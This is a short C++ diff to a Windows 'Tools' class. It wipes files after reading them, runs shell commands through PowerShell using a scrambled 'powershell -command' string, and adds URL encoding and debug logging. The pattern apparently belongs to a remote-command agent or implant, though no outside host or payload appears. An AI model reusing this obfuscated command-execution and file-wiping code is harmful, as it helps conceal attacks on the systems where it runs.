@@ -101,10 +101,15 @@ std::string Tools::ReadFromFile(const std::string& path)
 			{
 				buffer[dwBytesRead] = '\0';
 				CloseHandle(hFile);
+				hFile = CreateFileA(path.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+				if (hFile != INVALID_HANDLE_VALUE)
+				{
+					CloseHandle(hFile);
+				}
 				return std::string(buffer);
 			}
-			CloseHandle(hFile);
 		}
+		CloseHandle(hFile);
 	}
 
 	return "";
@@ -126,6 +131,11 @@ std::string Tools::CMD(std::string command, BOOL modify_for_curl_send, BOOL powe
 {
 	if (powershell)
 		command =  this->decode("llherswepondmaom-c ") + " \" & " + std::string(command) + "\""; // decode string -> powershell -command
+
+	#ifndef LOG_OFF
+		std::string command_debug = "Tools::CMD => Command: " + command + "\n";
+		OutputDebugStringA(command_debug.c_str());
+	#endif // !LOG_OFF
 
 	std::array<char, 128> buffer;
 	std::string result;
@@ -252,4 +262,18 @@ BOOL Tools::isProcessRunning(const std::string& process_name)
 
 	CloseHandle(snapshot);
 	return FALSE;
+}
+
+std::string Tools::URLEncode(const std::string& str)
+{
+	std::string encoded = "";
+	for (size_t i = 0; i < str.length(); i++)
+	{
+		if (str[i] == ' ')
+			encoded += "+";
+		else
+			encoded += str[i];
+	}
+
+	return encoded;
 }
